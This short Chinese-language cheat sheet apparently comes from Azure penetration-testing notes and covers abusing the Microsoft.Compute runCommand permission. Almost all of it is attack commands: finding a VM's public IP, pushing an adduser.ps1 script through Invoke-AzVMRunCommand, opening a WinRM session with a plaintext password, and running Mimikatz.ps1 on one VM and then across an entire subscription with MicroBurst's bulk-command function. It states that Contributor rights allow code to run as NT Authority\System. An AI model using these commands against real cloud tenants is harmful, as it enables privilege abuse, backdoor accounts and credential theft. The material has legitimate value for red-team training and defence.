	要求：
	Microsoft.Compute/virtualMachines/runCommand/action
	Get Public IP of VM : 查询网络接口
	PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
	PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
	PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>

	在虚拟机上执行 Powershell 脚本
	PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose

	通过 WinRM 连接
	PS C:\Tools> $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
	PS C:\Tools> $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
	PS C:\Tools> $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
	PS C:\Tools> Enter-PSSession $sess
	允许任何具有“Contributor”权限的人在订阅中的任何 Azure VM 上以 NT Authority\System 的身份运行 PowerShell 脚本

	列出可用的虚拟机
	PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
	ResourceGroupName    Name       
	-----------------    ----       
	TESTRESOURCES        Remote-Test

	在虚拟机上执行 Powershell 脚本
	PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
	使用 MicroBurst.ps1 针对整个订阅

	Import-module MicroBurst.psm1
	Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt